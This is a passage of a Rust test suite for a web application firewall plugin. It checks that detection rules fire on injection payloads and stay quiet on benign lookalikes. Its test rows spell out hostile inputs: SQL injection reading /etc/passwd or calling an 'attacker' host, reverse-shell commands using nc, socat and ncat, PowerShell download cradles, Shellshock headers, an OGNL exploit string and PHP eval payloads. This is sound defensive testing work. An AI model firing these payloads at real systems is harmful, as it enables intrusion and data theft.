//! Built-in rule-pack coverage for the attack classes an enterprise WAF is
//! expected to recognise out of the box: blind / enumeration / error-based
//! SQL injection, cookie-borne injection, script-URL obfuscation, active HTML
//! elements, command execution without a classic `;cmd` chain, Shellshock,
//! OGNL, PHP and Node.js code injection, response splitting, restricted-file
//! probing, executable uploads, deserialization gadgets, and alternate
//! loopback spellings.
//!
//! Every case drives the real plugin hooks (`authorize` for request metadata,
//! the final request-body hook for bodies) so the assertions cover the
//! decode/normalization pipeline and target routing, not just the regex. Each
//! attack row has a benign twin chosen from the false-positive shape the
//! signature was designed around, so a later broadening shows up here.

use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext};
use ferrum_edge::policy_path::canonicalize_policy_path;
use serde_json::json;

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

/// Monitor-mode pack at `paranoia_level`, with the scan budget pinned off so
/// rule semantics never depend on machine speed.
fn monitor_waf(paranoia_level: u8) -> Waf {
    Waf::new(&json!({
        "mode": "monitor",
        "paranoia_level": paranoia_level,
        "scan_budget_ms": 0
    }))
    .unwrap()
}

fn hits(ctx: &RequestContext) -> Vec<String> {
    ctx.metadata
        .get("waf.rule_hits")
        .map(|hits| hits.split(',').map(str::to_string).collect())
        .unwrap_or_default()
}

fn hit(ctx: &RequestContext, rule_id: &str) -> bool {
    hits(ctx).iter().any(|hit| hit == rule_id)
}

/// One inspected request surface.
enum Surface<'a> {
    /// Raw query string, exactly as it would follow `?` on the wire.
    Query(&'a str),
    Header(&'a str, &'a str),
    Cookie(&'a str),
    /// Canonical policy path.
    Path(&'a str),
    /// Request body with its declared content type.
    Body(&'a str, &'a [u8]),
}

async fn scan(plugin: &Waf, surface: &Surface<'_>) -> (PluginResult, RequestContext) {
    match surface {
        Surface::Query(raw) => {
            let mut request = ctx("GET", "/search");
            request.set_raw_query_string((*raw).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Header(name, value) => {
            let mut request = ctx("GET", "/");
            request
                .headers
                .insert((*name).to_string(), (*value).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Cookie(value) => {
            let mut request = ctx("GET", "/");
            request
                .headers
                .insert("cookie".to_string(), (*value).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Path(path) => {
            let mut request = ctx("GET", path);
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Body(content_type, body) => {
            let mut request = ctx("POST", "/submit");
            request
                .headers
                .insert("content-type".to_string(), (*content_type).to_string());
            let headers = request.headers.clone();
            let result = plugin
                .on_final_request_body_with_context(&mut request, &headers, body)
                .await;
            (result, request)
        }
    }
}

fn describe(surface: &Surface<'_>) -> String {
    match surface {
        Surface::Query(raw) => format!("query {raw:?}"),
        Surface::Header(name, value) => format!("header {name}: {value:?}"),
        Surface::Cookie(value) => format!("cookie {value:?}"),
        Surface::Path(path) => format!("path {path:?}"),
        Surface::Body(content_type, body) => {
            format!("{content_type} body {:?}", String::from_utf8_lossy(body))
        }
    }
}

async fn assert_detected(plugin: &Waf, rule_id: &str, surface: Surface<'_>) {
    let (_, request) = scan(plugin, &surface).await;
    assert!(
        hit(&request, rule_id),
        "{rule_id} must fire on {}; hits={:?}",
        describe(&surface),
        hits(&request)
    );
}

async fn assert_clean(plugin: &Waf, rule_id: &str, surface: Surface<'_>) {
    let (_, request) = scan(plugin, &surface).await;
    assert!(
        !hit(&request, rule_id),
        "{rule_id} must not fire on {}; hits={:?}",
        describe(&surface),
        hits(&request)
    );
}

const JSON: &str = "application/json";
const TEXT: &str = "text/plain";
const FORM: &str = "application/x-www-form-urlencoded";

#[tokio::test]
async fn blind_time_delay_sqli_is_detected_in_query_and_body() {
    let plugin = monitor_waf(1);
    for query in [
        "id=1%20AND%20SLEEP(5)",
        "id=sleep(5)",
        "id=1;SELECT%20pg_sleep(10)",
        "id=(SELECT(SLEEP(5)))",
        "id=1'/**/AND/**/SLEEP(5)--%20",
        "id=1%20or%20benchmark(5000000,md5(1))",
        "id=1';WAITFOR%20DELAY%20'0:0:5'--",
        "id=x'||dbms_pipe.receive_message('a',5)||'",
    ] {
        assert_detected(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
    }
    assert_clean(&plugin, "FE-SQLI-006", Surface::Query("q=sleep%20tips")).await;

    // Level-1 body coverage requires SQL context around the delay call.
    for body in [
        br#"{"id":"1 AND SLEEP(5)"}"#.as_slice(),
        br#"{"id":"1' AND (SELECT(SLEEP(5)))-- "}"#,
        br#"{"id":"1 AND IF(1=1,SLEEP(5),0)"}"#,
        br#"{"id":"x'+sleep(5)+'"}"#,
        br#"{"id":"1 ORDER BY SLEEP(5)"}"#,
        br#"{"q":"x'||pg_sleep(5)||'"}"#,
        br#"{"id":"1) OR BENCHMARK(5000000,MD5(1))#"}"#,
        br#"{"id":"1';WAITFOR DELAY '0:0:5'--"}"#,
    ] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-010-B",
        Surface::Body(FORM, b"id=1+AND+SLEEP%285%29"),
    )
    .await;

    // Application code calls `sleep` as a method, after `await`, after a
    // statement separator, in an assignment, or in parentheses; `benchmark`
    // is an ordinary function name. None of these is SQL context.
    let code_bodies = [
        br#"{"code":"import time\ntime.sleep(1)"}"#.as_slice(),
        br#"{"code":"await sleep(100)"}"#,
        br#"{"note":"I need sleep; benchmark results are in"}"#,
        br#"{"code":"foo();\n  sleep(1);"}"#,
        br#"{"code":"x = sleep(5)"}"#,
        br#"{"code":"if ready: (sleep(1))"}"#,
        br#"{"code":"benchmark(1000, fn)"}"#,
    ];
    for body in code_bodies {
        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
        assert_clean(&plugin, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-SQLI-010-B",
        Surface::Body(TEXT, b"void run() {\n  foo();\n  sleep(1);\n}\n"),
    )
    .await;

    // The exact query-pattern body mirror is level 2, where code shapes are an
    // accepted cost.
    let level_two = monitor_waf(2);
    for body in [
        br#"{"id":"1;sleep(5)"}"#.as_slice(),
        br#"{"code":"x = sleep(5)"}"#,
    ] {
        assert_detected(&level_two, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
    }
}

/// Unquoted time-delay probes are level 1 in bodies where no general-purpose
/// language writes them: a later `ORDER BY` / `GROUP BY` item, a number that
/// opens the value followed by an operator, and a form pair whose whole value
/// is the call. Code assignments and calls stay clean.
#[tokio::test]
async fn unquoted_time_delay_shapes_are_level_one_in_bodies() {
    let plugin = monitor_waf(1);
    for body in [
        br#"{"id":"1-sleep(5)"}"#.as_slice(),
        br#"{"id":"1*sleep(5)"}"#,
        br#"{"id":"1 ORDER BY 1,sleep(5)"}"#,
        br#"{"id":"1 group by id, name, sleep(5)"}"#,
    ] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    for body in [
        b"id=sleep(5)".as_slice(),
        b"a=1&id=sleep%285%29&b=2",
        b"id=1-sleep(5)",
        b"id=sleep(5)--+",
    ] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(FORM, body)).await;
    }

    for body in [
        br#"{"code":"x=sleep(5)"}"#.as_slice(),
        br#"{"code":"total = 1 + sleep(5)"}"#,
        br#"{"code":"rows = group_by(items, sleep(5))"}"#,
        br#"{"note":"sort by name, sleep(8) hours"}"#,
        br#"{"cell":"sleep(5)"}"#,
    ] {
        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    for body in [
        b"x=sleep(5);\nprint(x)".as_slice(),
        b"x = sleep(5)\nfoo();\nsleep(1);\ntime.sleep(1)",
    ] {
        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(TEXT, body)).await;
    }
    // A JSON string whose whole value is the call is claimed only at level 2.
    assert_detected(
        &monitor_waf(2),
        "FE-SQLI-006-B",
        Surface::Body(JSON, br#"{"cell":"sleep(5)"}"#),
    )
    .await;
}

/// `ORDER BY` accepts the inline-comment separator, the number-then-operator
/// shape accepts comparison operators, and a form pair may end at a `/*`
/// comment. The number-then-operator shape counts only when it is the whole
/// value, so compact code and a spreadsheet formula stay clean.
#[tokio::test]
async fn time_delay_body_shapes_accept_comments_and_skip_compact_code() {
    let plugin = monitor_waf(1);
    for body in [
        br#"{"id":"1 ORDER/**/BY 1,sleep(5)"}"#.as_slice(),
        br#"{"id":"1 order by 1/**/,sleep(5)"}"#,
        br#"{"id":"1=sleep(5)"}"#,
    ] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    for body in [b"id=sleep(5)/*x*/".as_slice(), b"a=1&id=1-sleep(5)/*"] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(FORM, body)).await;
    }

    for body in [
        br#"{"code":"x=1+sleep(5)"}"#.as_slice(),
        br#"{"cell":"=2*sleep(1)"}"#,
        br#"{"code":"y = 2*sleep(1) + 3"}"#,
    ] {
        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-SQLI-010-B",
        Surface::Body(TEXT, b"x=1+sleep(5);\nprint(x)"),
    )
    .await;
}

/// A query value holds only the injected expression, so a number followed by
/// an operator and a delay call at the start of the value is precise there.
#[tokio::test]
async fn numeric_context_time_delay_opens_the_query_value() {
    let plugin = monitor_waf(1);
    for query in [
        "id=1-sleep(5)",
        "id=1*sleep(5)",
        "id=1%2Bsleep(5)",
        "id=1/sleep(5)",
        "id=1%5Esleep(5)",
        "id=-1-sleep(5)",
    ] {
        assert_detected(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
    }
    for query in ["q=a-sleep(5)", "q=room%201-sleep(5)", "q=time.sleep(1)"] {
        assert_clean(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
    }

    // The level-2 body mirror shares the pattern: a body that opens with the
    // expression matches it.
    let level_two = monitor_waf(2);
    for body in [b"1-sleep(5)".as_slice(), b"1*sleep(5)"] {
        assert_detected(&level_two, "FE-SQLI-006-B", Surface::Body(TEXT, body)).await;
    }
}

#[tokio::test]
async fn catalog_enumeration_and_error_based_sqli_are_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "q=1%20union%20select%20table_name%20from%20information_schema.tables",
        "q=select%20sql%20from%20sqlite_master",
        "q=select%20name%20from%20sysobjects",
        "q=select%20*%20from%20pg_catalog.pg_tables",
    ] {
        assert_detected(&plugin, "FE-SQLI-007", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-007-B",
        Surface::Body(JSON, br#"{"q":"select usename from pg_shadow"}"#),
    )
    .await;
    // Ordinary keys that merely resemble catalog objects.
    assert_clean(
        &plugin,
        "FE-SQLI-007-B",
        Surface::Body(
            JSON,
            br#"{"all_users":[],"user_tables":1,"mysql.user":"app"}"#,
        ),
    )
    .await;

    for query in [
        "q=1%20and%20extractvalue(1,concat(0x7e,version()))",
        "q=updatexml(null,concat(0x7e,user()),null)",
        "q=union%20select%20load_file('/etc/passwd')",
        "q=1%20into%20outfile%20'/var/www/x.php'",
        "q=exec%20master..xp_cmdshell%20'whoami'",
    ] {
        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
    }
    for body in [
        b"x' AND utl_http.request('http://attacker/')='1".as_slice(),
        b"1 union select load_file(0x2f6574632f706173737764)",
        b"1 union select load_file(concat('\\\\',version(),'.attacker.example\\a'))",
    ] {
        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-SQLI-008",
        Surface::Query("q=update%20xml%20outfile%20docs"),
    )
    .await;
    // `load_file` as an ordinary function or method name.
    for body in [
        b"def load_file(path):\n    return open(path).read()\n".as_slice(),
        b"data = load_file(filename)",
        b"cfg = loader.load_file('/etc/app.conf')",
        b"$cfg = $this->load_file('/var/www/app.conf');",
        b"cfg = Foo::load_file('/etc/app.conf');",
    ] {
        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
}

/// `load_file` also reads a MySQL `X'…'` hex literal, and SQL accepts an
/// inline comment before the argument.
#[tokio::test]
async fn load_file_hex_literal_and_commented_argument_are_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "q=union%20select%20load_file(X'2f6574632f706173737764')",
        "q=union%20select%20load_file(/**/'/etc/passwd')",
        "q=load_file(/*x*/0x2f6574632f706173737764)",
    ] {
        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
    }
    for body in [
        b"1 union select load_file(x'2f6574632f706173737764')".as_slice(),
        b"1 union select load_file(/**/'/etc/passwd')",
        b"1 union select load_file( /* a */ 0x2f6574632f706173737764)",
    ] {
        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
    // Ordinary function and method names, with or without a comment.
    for body in [
        b"def load_file(path):\n    return open(path).read()\n".as_slice(),
        b"data = load_file(xpath)",
        b"data = load_file(/* default */ path)",
        b"cfg = loader.load_file(/**/'/etc/app.conf')",
        b"cfg = loader.load_file(X'2f65')",
    ] {
        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
}

/// MySQL also reads a string or hex literal behind a charset introducer
/// (`_latin1'…'`, `_binary 0x…`) and a `CONCAT_WS(` path. A leading
/// underscore identifier or a macro call is still an ordinary argument, and a
/// user variable is left out because Ruby writes `load_file(@path)`.
#[tokio::test]
async fn load_file_charset_introducer_and_concat_ws_are_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "q=union%20select%20load_file(_latin1'/etc/passwd')",
        "q=union%20select%20load_file(_binary%200x2f6574632f706173737764)",
        "q=union%20select%20load_file(concat_ws(0x2f,'','etc','passwd'))",
    ] {
        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
    }
    for body in [
        b"1 union select load_file(_utf8mb4'/etc/passwd')".as_slice(),
        b"1 union select load_file(CONCAT_WS(CHAR(47),'','etc','passwd'))",
    ] {
        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
    for body in [
        b"data = load_file(_path)".as_slice(),
        b"cfg = load_file(_T(\"app.conf\"))",
        b"cfg = load_file(@path)",
        b"cfg = loader.load_file(_latin1'/etc/app.conf')",
    ] {
        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
}

#[tokio::test]
async fn quoted_string_tautology_is_detected_including_unspaced_form() {
    let plugin = monitor_waf(1);
    for query in [
        "user=admin'%20or%20'1'='1",
        "user='or'1'='1",
        "user=x'%20||%20'a'%20like%20'a",
        "user='/**/or/**/'x'='x",
    ] {
        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"user":"admin' or 'a'='a"}"#),
    )
    .await;

    assert_clean(
        &plugin,
        "FE-SQLI-009",
        Surface::Query("q=rock%20'n'%20roll%20or%20'jazz'"),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"op":"or","expr":"a=b"}"#),
    )
    .await;
}

/// `like` is an English word, so a `like` tautology needs an injection-shaped
/// right operand: a wildcard, an unterminated string the application closes,
/// or a trailing SQL comment. Quoted words in prose stay clean.
#[tokio::test]
async fn like_tautology_requires_an_injection_shaped_right_operand() {
    let plugin = monitor_waf(1);
    for query in [
        "user=x'%20or%20'a'%20like%20'a",
        "user=x'%20or%20'a'%20like%20'%25",
        "user=x'%20or%20'a'%20like%20'a'--%20",
        "user=x'%20or%20'a'%20like%20'a'%23",
    ] {
        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"user":"admin' or 'a' like 'a"}"#),
    )
    .await;

    for query in [
        "q='soda'%20or%20'pop'%20like%20'grandma'",
        "q=%22soda%22%20or%20%22pop%22%20like%20%22grandma%22",
        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma'%20says%3F",
    ] {
        assert_clean(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
    for body in [
        br#"{"text":"Is it 'soda' or 'pop' like 'grandma' says?"}"#.as_slice(),
        b"Is it 'soda' or 'pop' like 'grandma' says?",
    ] {
        assert_clean(&plugin, "FE-SQLI-009-B", Surface::Body(TEXT, body)).await;
    }
}

/// The comment after a `like` right operand may follow closing parentheses, a
/// statement `;`, or a `LIMIT` clause.
#[tokio::test]
async fn like_tautology_comment_may_follow_parentheses_semicolon_or_limit() {
    let plugin = monitor_waf(1);
    for query in [
        "user=x'%20or%20'a'%20like%20'a')--%20",
        "user=x'%20or%20'a'%20like%20'a'))%23",
        "user=x'%20or%20'a'%20like%20'a'%3B--%20",
        "user=x'%20or%20'a'%20like%20'a'%20limit%201--%20",
        "user=x'%20or%20'a'%20like%20'a'%20LIMIT%200,1%23",
    ] {
        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"user":"admin' or 'a' like 'a')-- "}"#),
    )
    .await;

    for query in [
        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma')%20or%20not%3F",
        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma'%20limits%205%3F",
    ] {
        assert_clean(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
}

#[tokio::test]
async fn cookie_values_are_an_injection_surface() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-SQLI-001-C",
        Surface::Cookie("theme=dark; id=1 UNION SELECT password FROM users"),
    )
    .await;
    assert_detected(&plugin, "FE-SQLI-002-C", Surface::Cookie("uid=1 or 1=1")).await;
    assert_detected(
        &plugin,
        "FE-XSS-001-C",
        Surface::Cookie("pref=<script>alert(1)</script>"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-XSS-002-C",
        Surface::Cookie("return=javascript:alert(1)"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-PATHTRAV-001-C",
        Surface::Cookie("lang=../../../../etc/passwd"),
    )
    .await;

    // The Cookie header is split on `;` before matching, so the
    // stacked-statement `;` reaches `FE-SQLI-003-C` only percent-encoded,
    // through the decoded cookie views.
    assert_detected(
        &plugin,
        "FE-SQLI-003-C",
        Surface::Cookie("theme=dark; id=1%3BDROP%20TABLE%20users"),
    )
    .await;
    // Benign twin: an encoded `;` before a word that merely starts with a
    // statement keyword is a list separator, not a stacked statement.
    assert_clean(
        &plugin,
        "FE-SQLI-003-C",
        Surface::Cookie("filters=color%3Dred%3Bupdated_since%3D2026-01-01"),
    )
    .await;

    // Real-world cookie jars: analytics ids, JWT sessions, locale.
    for rule in [
        "FE-SQLI-001-C",
        "FE-SQLI-002-C",
        "FE-SQLI-003-C",
        "FE-XSS-001-C",
        "FE-XSS-002-C",
        "FE-PATHTRAV-001-C",
    ] {
        assert_clean(
            &plugin,
            rule,
            Surface::Cookie(
                "_ga=GA1.2.1234567890.1700000000; session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln; locale=en-US",
            ),
        )
        .await;
    }
}

#[tokio::test]
async fn script_url_scheme_survives_tab_and_newline_obfuscation() {
    let plugin = monitor_waf(1);
    // Browsers delete ASCII tab/LF/CR inside a URL before reading the scheme.
    for query in [
        "next=javascript:alert(1)",
        "next=java%09script:alert(1)",
        "next=jav%0Aascript:alert(1)",
        "next=java%26%23x09;script:alert(1)",
        "next=vbscript:msgbox(1)",
    ] {
        assert_detected(&plugin, "FE-XSS-002", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-XSS-002-B",
        Surface::Body(JSON, br#"{"url":"java&#x09;script:alert(1)"}"#),
    )
    .await;
    // Prose with a real space is not a URL scheme.
    assert_clean(
        &plugin,
        "FE-XSS-002",
        Surface::Query("title=java%20script:%20a%20primer"),
    )
    .await;
}

#[tokio::test]
async fn active_content_elements_are_detected_in_query_and_gated_in_body() {
    let level_one = monitor_waf(1);
    for query in [
        "q=%3Csvg/onload=alert(1)%3E",
        "q=%3Cbase%20href=//evil.example/%3E",
        "q=%3Cmeta%20http-equiv=refresh%20content=0;url=//evil%3E",
        "q=%3Ciframe%20src=//evil%3E",
    ] {
        assert_detected(&level_one, "FE-XSS-006-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-XSS-006-Q",
        Surface::Query("q=a%20%3C%20svg"),
    )
    .await;
    assert_clean(
        &level_one,
        "FE-XSS-006-Q",
        Surface::Query("q=%3Cmetadata%3E"),
    )
    .await;

    // Rich-text bodies legitimately carry markup, so the body mirror is L2.
    let body: &[u8] = br#"{"html":"<svg viewBox=\"0 0 1 1\"></svg>"}"#;
    assert_clean(&level_one, "FE-XSS-006-B", Surface::Body(JSON, body)).await;
    assert_detected(&monitor_waf(2), "FE-XSS-006-B", Surface::Body(JSON, body)).await;
}

#[tokio::test]
async fn command_execution_without_a_classic_chain_is_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "host=%60id%60",
        "host=$(whoami)",
        "host=x$(cat%20/etc/passwd)",
        "host=127.0.0.1%0Awhoami",
        "host=127.0.0.1%0D%0Aid",
        "host=127.0.0.1%0Acat%20/etc/passwd",
        "host=127.0.0.1%0Abash%20-i",
        "host=127.0.0.1%0AIPCONFIG",
        "host=a|uname%20-a",
        "host=a%26%26ifconfig",
        "host=a%26%26uname",
        "host=a;powershell%20-nop",
        "host=a|busybox%20%3E/tmp/x",
        "host=a;busybox%20nc%201.2.3.4%204444%20-e%20sh",
        "host=a|busybox%20wget%20http://x/y",
        "host=a;socat%20TCP4:h:4444%20EXEC:bash",
        "host=a;ncat%20h%204444%20-e%20cmd.exe",
        "host=127.0.0.1%0Aid%23",
        "host=a%26%26id",
        "file=cat${IFS}/etc/passwd",
    ] {
        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
    // Delimited lists, multi-line prose, and ordinary words do not fire
    // FE-CMD-004. FE-CMD-001, the older level-1 chain rule, still fires on a
    // list item that is one of its command words.
    for query in [
        "tags=linux;bash;php",
        "q=dogs|cat",
        "q=a;b;c",
        "company=R%26D",
        "price=$(USD)",
        "q=whoami",
        "tags=windows;powershell",
        "tags=windows;powershell;linux",
        "skills=bash|pwsh",
        "tags=linux;busybox",
        "fields=id|uname",
        "note=Order%0AID:%2012345",
        "note=Pets%0ACat%20food",
        "note=first%0Acat%20food%0Asecond",
        "note=intro%0APython%20is%20fun",
    ] {
        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
    for query in [
        "tags=linux;bash",
        "tags=linux;bash;php",
        "tags=windows;powershell",
        "q=dogs|cat",
    ] {
        assert_detected(&plugin, "FE-CMD-001", Surface::Query(query)).await;
    }

    for query in [
        "cmd=/bin/bash%20-i",
        "cmd=cmd.exe%20/c%20dir",
        "cmd=powershell%20-enc%20SQBFAFgA",
        "cmd=sh%20-c%20id",
        "cmd=python3%20-c%20'import%20os'",
    ] {
        assert_detected(&plugin, "FE-CMD-005-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &plugin,
        "FE-CMD-005-Q",
        Surface::Query("q=bash%20scripting"),
    )
    .await;

    // Deployment and CI APIs carry scripts, so the body mirror is L2.
    let script: &[u8] = br#"{"entrypoint":"/bin/sh -c ./start.sh"}"#;
    assert_clean(&plugin, "FE-CMD-005-B", Surface::Body(JSON, script)).await;
    assert_detected(&monitor_waf(2), "FE-CMD-005-B", Surface::Body(JSON, script)).await;
}

/// After a CR/LF, a capitalised Windows tool name without a flag starts a
/// prose line, and a spaced `&` (raw or as `&amp;`) is prose, not a shell
/// operator.
#[tokio::test]
async fn newline_command_ignores_capitalised_prose_and_spaced_ampersand() {
    let plugin = monitor_waf(1);
    for query in [
        "host=127.0.0.1%0APowerShell%20-nop%20-c%20x",
        "host=127.0.0.1%0ACertUtil%20/urlcache",
        "host=127.0.0.1%0Apowershell%20IEX(x)",
        "host=127.0.0.1%0APOWERSHELL",
        "host=127.0.0.1%0Acat%26%26id",
        "host=127.0.0.1%0Acat%20%26%26%20id",
        "host=127.0.0.1%0Aid%20|%20nc%20h%204444",
        "host=127.0.0.1%0Acat%20%3E%20/tmp/x",
    ] {
        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
    for query in [
        "note=Tools%0APowerShell%20is%20great",
        "note=Skills:%0APowerShell%0APython",
        "note=Books:%0APowerShell%20-%20a%20primer",
        "note=pets%0Acat%20%26amp;%20dog",
        "note=pets%0Acat%20%26%20dog",
        "note=pets%0Acat%20%26lt;%20dog",
        "note=pets%0Acat%20%3E%20dog",
    ] {
        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
}

/// `cmd.exe` and PowerShell resolve commands in any case, so a mixed-case
/// Windows tool after a CR/LF counts when it ends the value, carries `.exe`,
/// is followed by a shell operator or a flag, or (PowerShell) runs `iex` /
/// `invoke-`. A short command followed by a spaced `#` comment or a spaced
/// `&` that ends the value is a command too. Prose lines stay clean.
#[tokio::test]
async fn newline_command_catches_mixed_case_tools_spaced_comment_and_trailing_ampersand() {
    let plugin = monitor_waf(1);
    for query in [
        "host=127.0.0.1%0AWhoami",
        "host=127.0.0.1%0AWhoAmI",
        "host=127.0.0.1%0AIpconfig",
        "host=127.0.0.1%0ASysteminfo%20",
        "host=127.0.0.1%0AWhoami.exe%20/all",
        "host=127.0.0.1%0AWhoAmI|nc%20h%204444",
        "host=127.0.0.1%0AIpconfig%20%3E%20/tmp/x",
        "host=127.0.0.1%0APowershell%20IEX(New-Object%20Net.WebClient)",
        "host=127.0.0.1%0APwsh%20Invoke-Expression%20x",
        "host=127.0.0.1%0Aid%20%23",
        "host=127.0.0.1%0Aid%20%23%20rest%20of%20the%20command",
        "host=127.0.0.1%0Aid%20%26",
        "host=127.0.0.1%0Aid%20%26%20",
    ] {
        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
    for query in [
        "note=Tools%0APowerShell%20is%20great",
        "note=Skills:%0APowerShell%0APython",
        "note=Books:%0APowerShell%20-%20a%20primer",
        "note=Skills:%0APowerShell%20%26%20Python",
        "note=Opinion:%0APowerShell%20%3E%20Bash",
        "note=Skills:%0APowerShell.",
        "note=pets%0Acat%20%26%20dog",
        "note=pets%0Acat%20%26amp;%20dog",
    ] {
        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
}

#[tokio::test]
async fn shellshock_is_detected_in_headers_and_the_cgi_query_string() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("user-agent", "() { :; }; /bin/bash -c 'id'"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("referer", "(){ :;}; echo vulnerable"),
    )
    .await;
    // `QUERY_STRING` begins with the first pair's key.
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-Q",
        Surface::Query("()%20%7B%20:;%20%7D;%20/bin/id"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-QV",
        Surface::Query("x=()%20%7B%20:;%20%7D;%20/bin/id"),
    )
    .await;
    // Ordinary JavaScript never *starts* a header value with `() {`.
    assert_clean(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("x-snippet", "function() { return 1; }"),
    )
    .await;
    // Query keys and values that contain `() {` later, or `()` with no body.
    let benign_query = "()=1&cb=function()%20%7B%20return%201;%20%7D&sig=f()";
    for rule in ["FE-SHELLSHOCK-001-Q", "FE-SHELLSHOCK-001-QV"] {
        assert_clean(&plugin, rule, Surface::Query(benign_query)).await;
    }
}

#[tokio::test]
async fn ognl_injection_is_detected_including_the_content_type_vector() {
    let plugin = monitor_waf(1);
    // CVE-2017-5638 (S2-045) delivered its expression in `Content-Type`.
    assert_detected(
        &plugin,
        "FE-OGNL-001-H",
        Surface::Header(
            "content-type",
            "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):x)}",
        ),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-OGNL-001-Q",
        Surface::Query("x=%24%7B%40java.lang.Runtime%40getRuntime().exec('id')%7D"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-OGNL-001-B",
        Surface::Body(
            FORM,
            b"x=%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue",
        ),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-OGNL-001-Q",
        Surface::Query("email=dev@java.lang.example.org&t=%25%7Bname%7D"),
    )
    .await;
    // A real multipart `Content-Type`, and a body with a CSS id selector, a
    // `%{name}` format placeholder, and a `java.lang` email address.
    assert_clean(
        &plugin,
        "FE-OGNL-001-H",
        Surface::Header("content-type", "multipart/form-data; boundary=----x1"),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-OGNL-001-B",
        Surface::Body(
            JSON,
            br##"{"selector":"#context-menu","template":"%{name}","email":"dev@java.lang.example.org"}"##,
        ),
    )
    .await;
}

#[tokio::test]
async fn php_and_node_code_injection_are_detected() {
    let level_one = monitor_waf(1);
    for query in [
        "x=%3C?php%20system('id');%20?%3E",
        "x=eval($_POST%5B'c'%5D)",
        "x=assert(base64_decode('cGhwaW5mbygpOw=='))",
        "x=system('id')",
    ] {
